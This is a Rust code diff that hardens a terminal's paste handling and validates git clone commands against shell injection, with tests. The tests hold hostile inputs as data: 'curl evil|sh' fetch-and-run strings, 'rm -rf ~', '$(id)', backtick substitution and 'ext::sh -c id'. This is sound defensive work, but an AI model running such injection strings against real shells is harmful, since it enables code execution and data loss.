@@ -23,6 +23,38 @@ pub struct Screen {
     pub scrolled: bool,
 }
 
+/// Pasted text as it's safe to send: line breaks as Return, and no control characters.
+///
+/// A program that asked for bracketed paste gets the text between `ESC[200~` and `ESC[201~`
+/// and treats it as text. An `ESC[201~` inside the paste would end that early, and what
+/// follows would run as if typed. So escape and the other control characters are dropped
+/// (tab and line breaks stay), as xterm does.
+pub fn clean_paste(text: &str) -> String {
+    text.replace("\r\n", "\r").replace('\n', "\r").chars().filter(|c| !c.is_control() || matches!(c, '\r' | '\t')).collect()
+}
+
+/// The command that clones `url` into a folder `name` and goes into it.
+///
+/// It is typed into a shell, and both values come from the API (a GitHub Enterprise server
+/// allows names github.com doesn't). Only plain addresses and names are accepted, so nothing
+/// in them can be read by the shell as another command.
+pub fn clone_command(url: &str, name: &str) -> Result<String, String> {
+    let plain = |s: &str| !s.is_empty() && !s.starts_with(['-', '.']) && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'));
+    let path_ok = url.strip_prefix("https://").is_some_and(|rest| {
+        let mut parts = rest.split('/');
+        let host_ok = parts.next().is_some_and(|h| {
+            let (host, port) = h.split_once(':').unwrap_or((h, "0"));
+            plain(host) && !port.is_empty() && port.chars().all(|c| c.is_ascii_digit())
+        });
+        let segs: Vec<&str> = parts.collect();
+        host_ok && segs.len() >= 2 && segs.iter().all(|s| plain(s))
+    });
+    if !path_ok || !plain(name) {
+        return Err(format!("RepoHub won't type this clone command: the repository's address or name has unusual characters ({url}). Clone it yourself, then pick the folder."));
+    }
+    Ok(format!("git clone -- {url}.git {name} && cd {name}\r"))
+}
+
 /// Bytes a key sends to the shell, xterm-style.
 pub fn key_bytes(ev: &rune::KeyEvent) -> Option<Vec<u8>> {
     use rune::Key;
@@ -200,7 +232,7 @@ mod native {
         /// Types text as if pasted (bracketed when the program asked for it).
         pub fn paste(&mut self, text: &str) {
             let bracketed = self.parser.lock().map(|p| p.screen().bracketed_paste()).unwrap_or(false);
-            let t = text.replace("\r\n", "\r").replace('\n', "\r");
+            let t = super::clean_paste(text);
             if bracketed {
                 self.write(format!("\x1b[200~{t}\x1b[201~").as_bytes());
             } else {
@@ -327,6 +359,38 @@ impl Term {
 
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn a_paste_cant_end_itself_or_carry_control_characters() {
+        // The clipboard holds text that tries to close the bracketed paste and run a command.
+        let t = super::clean_paste("ls\x1b[201~curl evil|sh\r\nnext\tcol\u{9b}201~\x07\x00");
+        assert!(!t.contains('\x1b') && !t.contains('\u{9b}') && !t.contains('\x07') && !t.contains('\0'));
+        assert_eq!(t, "ls[201~curl evil|sh\rnext\tcol201~");
+        assert_eq!(super::clean_paste("a\nb\r\nc"), "a\rb\rc");
+        assert_eq!(super::clean_paste("caffè ✓"), "caffè ✓");
+    }
+
+    #[test]
+    fn clone_commands_take_plain_addresses_only() {
+        assert_eq!(super::clone_command("https://github.com/octo/demo.rs", "demo.rs").unwrap(), "git clone -- https://github.com/octo/demo.rs.git demo.rs && cd demo.rs\r");
+        assert!(super::clone_command("https://ghe.example:8443/team/sub/app", "app").is_ok());
+        for (url, name) in [
+            ("https://github.com/octo/x; curl evil|sh", "x; curl evil|sh"),
+            ("https://github.com/octo/demo", "demo && rm -rf ~"),
+            ("https://github.com/octo/demo", "$(id)"),
+            ("https://github.com/octo/demo", "-oProxyCommand=x"),
+            ("https://github.com/octo/demo", ".."),
+            ("https://github.com/octo/`id`", "demo"),
+            ("https://github.com/octo/de mo", "demo"),
+            ("ext::sh -c id", "demo"),
+            ("http://github.com/octo/demo", "demo"),
+            ("https://github.com/demo", "demo"),
+            ("https://github.com:x/octo/demo", "demo"),
+            ("https://github.com/octo/demo", ""),
+        ] {
+            assert!(super::clone_command(url, name).is_err(), "{url} {name}");
+        }
+    }
+
     use super::*;
     use rune::{Key, KeyEvent};
 
